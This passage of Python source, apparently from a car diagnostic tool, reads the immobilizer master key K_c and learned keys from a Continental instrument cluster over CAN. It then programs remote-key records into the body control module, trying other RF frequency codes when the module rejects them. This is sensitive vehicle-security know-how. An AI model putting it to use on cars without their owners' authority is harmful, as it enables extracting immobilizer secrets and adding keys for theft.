                # BCM 80 02 handler (`0x000C795E` on EA/0511) requires sequential 1..N slot indices in the header nibble.
                norm_entries.append((idx, cipher))
        else:
            raise ValueError("Specify entries, keys, or clear_all=True for can_bcm_adapt_ffb()")

        pdu_80_01 = bcm_build_wfs_80_01(gfa_bytes, k_ffb_bytes)
        pdu_80_02 = bcm_build_wfs_80_02(norm_entries)

        reporter.step(
            2,
            4,
            tr(
                "Шаг 1 WFS Ch 3 (0x17F8140E): передача секрета радиоканала 80 01 || AES_GFA(K_ffb)",
                "WFS Ch 3 Step 1 (0x17F8140E): sending FFB channel secret 80 01 || AES_GFA(K_ffb)",
            ),
        )
        resp_80_01 = link.request_wfs(pdu_80_01, expected_first_byte=0xC0, timeout=3.0)
        if resp_80_01[:2] != b"\xc0\x01":
            raise RuntimeError(
                tr(
                    f"BCM отклонил команду 80 01: получен ответ {resp_80_01.hex().upper()} (ожидался C0 01)",
                    f"BCM rejected 80 01: received {resp_80_01.hex().upper()} (expected C0 01)",
                )
            )

        reporter.step(
            3,
            4,
            tr(
                f"Шаг 2 WFS Ch 3 (0x17F8140E): передача списка радиоключей 80 02 ({len(norm_entries)} шт., {BCM_FREQUENCIES.get(eff_freq, hex(eff_freq))})",
                f"WFS Ch 3 Step 2 (0x17F8140E): sending FFB key records 80 02 ({len(norm_entries)} key(s), {BCM_FREQUENCIES.get(eff_freq, hex(eff_freq))})",
            ),
        )
        try:
            resp_80_02 = link.request_wfs(pdu_80_02, expected_first_byte=0xC0, timeout=3.5)
        except UdsNegativeResponse as exc_22:
            if exc_22.nrc != 0x22 or not parsed_key_specs:
                raise
            # NRC 0x22 on `80 02` is exclusively a 2-bit RF frequency code mismatch (`P[8] != (DID_0A65[0] >> 1) & 3`).
            # Probe remaining 2-bit frequency codes (prioritizing 0x03 = 434.42 MHz).
            resp_80_02 = b""
            for cand_freq in (0x03, 0x02, 0x01, 0x00):
                if cand_freq == eff_freq:
                    continue
                cand_entries = [
                    (
                        seq_i,
                        bcm_encrypt_ffb_key_record(
                            k_ffb_bytes,
                            s_arg,
                            rolling_counter=c_arg,
                            freq_code=cand_freq,
                        ),
                    )
                    for seq_i, (s_arg, c_arg) in enumerate(parsed_key_specs, start=1)
                ]
                cand_80_02 = bcm_build_wfs_80_02(cand_entries)
                try:
                    resp_80_01 = link.request_wfs(pdu_80_01, expected_first_byte=0xC0, timeout=3.0)
                    resp_80_02 = link.request_wfs(cand_80_02, expected_first_byte=0xC0, timeout=3.5)
                    if resp_80_02[:2] == b"\xc0\x02":
                        eff_freq = cand_freq
                        norm_entries = cand_entries
                        pdu_80_02 = cand_80_02
                        break
                except UdsNegativeResponse as retry_exc:
                    if retry_exc.nrc == 0x22:
                        continue
                    raise
            if resp_80_02[:2] != b"\xc0\x02":
                raise
        if resp_80_02[:2] != b"\xc0\x02":
            raise RuntimeError(
                tr(
                    f"BCM отклонил записи ключей 80 02: ответ {resp_80_02.hex().upper()} (ожидался C0 02). Проверьте частоту DID 0x0A65 (0x{eff_freq:02X}) и GFA.",
                    f"BCM rejected 80 02 key records: received {resp_80_02.hex().upper()} (expected C0 02). Check DID 0x0A65 frequency (0x{eff_freq:02X}) and GFA.",
                )
            )

        reporter.step(
            4,
            4,
            tr(
                "Проверка сохранённых слотов FFB в 09 BCM (DID 0x1983 и NvM 0x05..0x19)",
                "Verifying stored FFB key slots in 09 BCM (DID 0x1983 and NvM 0x05..0x19)",
            ),
        )
        time.sleep(0.15)
        status_after = _read_bcm_status_in_session(link, include_nvm_slots=verify_after, profile=profile)
        reporter.info(
            tr(
                f"Адаптация FFB завершена (C0 01 -> C0 02): записано ключей {len(norm_entries)}, DID 0x1983 = {status_after.get('ffb_1983_hex', '')}",
                f"FFB adaptation completed (C0 01 -> C0 02): {len(norm_entries)} key(s) written, DID 0x1983 = {status_after.get('ffb_1983_hex', '')}",
            )
        )
        return {
            "ecu_kind": "bcm",
            "operation": "adapt_ffb",
            "via_gateway": bool(via_gateway),
            "gateway_bridged": bool(bridged),
            "profile": profile,
            "passport": passport,
            "gfa_source": gfa_source,
            "gfa_hex": gfa_bytes.hex(),
            "k_ffb_hex": k_ffb_bytes.hex(),
            "freq_code": eff_freq,
            "freq_label": BCM_FREQUENCIES.get(eff_freq, f"0x{eff_freq:02X}"),
            "keys_adapted": len(norm_entries),
            "pdu_80_01_hex": pdu_80_01.hex(),
            "resp_80_01_hex": resp_80_01.hex(),
            "pdu_80_02_hex": pdu_80_02.hex(),
            "resp_80_02_hex": resp_80_02.hex(),
            "status_before": status_before,
            "status_after": status_after,
        }


def can_bcm_adapt_ffb_from_cluster(
    port: str,
    *,
    fpke_dflash: bytes | None = None,
    fpke_cflash: bytes | None = None,
    gfa_override: bytes | str | None = None,
    prefer_raw_eel_6a: bool = True,
    sync_bcm_gfa_to_cluster: bool = False,
    current_bcm_ika: bytes | str | None = None,
    interface: str = "slcan",
    bus: Any | None = None,
    via_gateway: bool = False,
    gateway_bridge: bool = False,
    gateway_channel: int = 0,
    sw_profile: str | None = None,
    log_path: Path | None = None,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Read `K_c`, `GFA (/1)`, and learned keys from `17 FPK_E` (live over CAN or from provided Dflash) and adapt `09 BCM` FFB."""
    dflash_bytes = fpke_dflash
    cluster_read_report: dict[str, Any] | None = None
    if dflash_bytes is None:
        from contitool.can.ecus import _probe_uds_1003, _read_ident_dids
        from contitool.can.fpke import can_fpke_read_region, close_active_fpke_link
        from contitool.can.workflows import _probe_fpke_uds_with_wake
        from contitool.core.fpke import is_fpke_ident

        if bus is None:
            close_active_fpke_link()

        reporter.info(
            tr(
                "Проверка наличия панели приборов 17 FPK_E (0x714 → 0x77E) на шине CAN...",
                "Checking that 17 FPK_E instrument cluster (0x714 → 0x77E) is connected on the CAN bus...",
            )
        )
        with J533CanLink(port, interface=interface, bus=bus) as probe_link:
            if via_gateway:
                fpke_ok, _ = _probe_uds_1003(
                    probe_link,
                    0x714,
                    0x77E,
                    timeout=0.45 if bus is not None else 1.2,
                )
            else:
                fpke_ok, _ = _probe_fpke_uds_with_wake(
                    probe_link,
                    bus=bus,
                    interface=interface,
                    reporter=reporter,
                )
            if not fpke_ok:
                raise RuntimeError(
                    tr(
                        "Панель приборов 17 FPK_E (0x714 → 0x77E) не обнаружена на шине CAN. "
                        "Подключите панель приборов к общей шине CAN с блоком 09 BCM — либо загрузите дамп Dflash.bin "
                        "и используйте кнопку «Адаптировать ключи (80 01 + 80 02)».",
                        "17 FPK_E instrument cluster (0x714 → 0x77E) was not detected on the CAN bus. "
                        "Connect the instrument cluster to the CAN bus together with 09 BCM — or load a Dflash.bin dump "
                        "and click “Adapt keys (80 01 + 80 02)”.",
                    )
                )
            fpke_ident = _read_ident_dids(
                probe_link,
                keepalive_direct_fpke=not via_gateway,
                reporter=reporter,
            )
            if fpke_ident and not is_fpke_ident(fpke_ident):
                raise RuntimeError(
                    tr(
                        "На адресе 17 (0x714 → 0x77E) ответила неподдерживаемая панель приборов (ожидается Continental FPK_E).",
                        "An unsupported instrument cluster answered at address 17 (0x714 → 0x77E; expected Continental FPK_E).",
                    )
                )

    # Check 09 BCM reachability & RF frequency (DID 0x0A65) over UDS before reading 64 KB DataFlash
    st_res = can_bcm_status(
        port,
        interface=interface,
        bus=bus,
        via_gateway=via_gateway,
        gateway_bridge=gateway_bridge,
        gateway_channel=gateway_channel,
        sw_profile=sw_profile,
        include_nvm_slots=False,
        log_path=log_path,
        reporter=reporter,
    )
    bcm_freq = int(st_res["status"].get("freq_code", 0x02)) & 0xFF

    if dflash_bytes is None:
        from contitool.can.fpke import can_fpke_read_region

        reporter.info(
            tr(
                "Чтение DataFlash (64 КБ) панели приборов 17 FPK_E по шине CAN для извлечения K_c и ключей...",
                "Reading 17 FPK_E instrument cluster DataFlash (64 KB) over CAN to extract K_c and keys...",
            )
        )
        cluster_read_report = can_fpke_read_region(
            port,
            mode="dflash",
            interface=interface,
            via_gateway=via_gateway,
            gateway_bridge=gateway_bridge,
            gateway_channel=gateway_channel,
            bus=bus,
            reporter=reporter,
        )
        out_path = Path(cluster_read_report["output"])
        dflash_bytes = out_path.read_bytes()

    cluster_mat = bcm_extract_cluster_ffb_material(dflash_bytes, fpke_cflash, freq_code=bcm_freq)
    if not cluster_mat.get("kc_hex"):
        raise RuntimeError(
            tr(
                "В дампе панели приборов 17 FPK_E отсутствует мастер-ключ иммобилайзера K_c (EEL 0x68).",
                "Immobilizer master key K_c (EEL 0x68) is missing in the 17 FPK_E cluster DataFlash.",
            )
        )

    # Optionally synchronize BCM GFA to cluster's /1 GFA before FFB adaptation if requested
    if sync_bcm_gfa_to_cluster and cluster_mat.get("gfa_hex"):
        ika_for_sync = current_bcm_ika
        if not ika_for_sync:
            keys_res = can_bcm_read_keys(
                port,
                interface=interface,
                bus=bus,
                via_gateway=via_gateway,
                gateway_bridge=gateway_bridge,
                gateway_channel=gateway_channel,
                sw_profile=sw_profile,
                log_path=log_path,
                reporter=reporter,
            )
            ika_for_sync = keys_res["ika_hex"]
        can_bcm_write_keys(
            port,
            current_ika=ika_for_sync,
            new_gfa=cluster_mat["gfa_hex"],
            hard_reset=True,
            interface=interface,
            bus=bus,
            via_gateway=via_gateway,
            gateway_bridge=gateway_bridge,
            gateway_channel=gateway_channel,
            sw_profile=sw_profile,
            log_path=log_path,
            reporter=reporter,
        )
        eff_gfa: bytes | str | None = cluster_mat["gfa_hex"]
    else:
        # Use explicit override if provided; otherwise let can_bcm_adapt_ffb read BCM's actual active GFA via XCP
        eff_gfa = gfa_override

    if prefer_raw_eel_6a and cluster_mat.get("raw_6a_matches_freq") and cluster_mat.get("recommended_entries"):
        entries_arg: list[tuple[int, bytes | str]] | None = [
            (int(s), str(c)) for s, c in cluster_mat["recommended_entries"]
        ]
        keys_arg: list[dict[str, Any]] | None = None
    else:
        entries_arg = None
        keys_arg = list(cluster_mat.get("active_transponders") or [])

    if not entries_arg and not keys_arg:
        raise RuntimeError(
            tr(
                "В приборной панели 17 FPK_E нет активных обученных ключей (EEL 0x67 / 0x6A пусты).",
                "17 FPK_E instrument cluster has no active learned keys (EEL 0x67 / 0x6A are empty).",
            )
        )

    adapt_res = can_bcm_adapt_ffb(
        port,
        gfa=eff_gfa,
        k_ffb=cluster_mat["k_ffb_hex"],
        entries=entries_arg,
        keys=keys_arg,
        freq_code=bcm_freq,
        verify_after=True,
        interface=interface,
        bus=bus,
        via_gateway=via_gateway,
        gateway_bridge=gateway_bridge,
        gateway_channel=gateway_channel,
        sw_profile=sw_profile,
        log_path=log_path,
        reporter=reporter,
    )
    adapt_res["cluster_material"] = cluster_mat
    if cluster_read_report is not None:
        adapt_res["cluster_read_output"] = cluster_read_report.get("output")
    return adapt_res
